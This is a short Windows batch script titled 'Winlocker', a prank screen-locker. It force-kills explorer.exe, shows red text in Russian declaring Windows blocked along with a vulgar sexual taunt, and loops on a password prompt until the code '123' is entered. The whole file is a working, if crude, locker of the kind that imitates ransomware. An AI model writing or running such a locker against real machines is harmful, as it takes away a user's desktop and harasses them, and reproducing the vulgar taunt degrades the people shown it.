@echo off  
chcp 65001  
taskkill /im explorer.exe /f >nul  
Title Winlocker  
color 0c    
echo Windows Заблокирован! 
echo Для разблокировки  
echo Надо пососать:    
:h  
set /p x= 
if %x%==123 (echo win start
start explorer 
exit  
) else (
echo Неправильный пароль!  
)  
goto h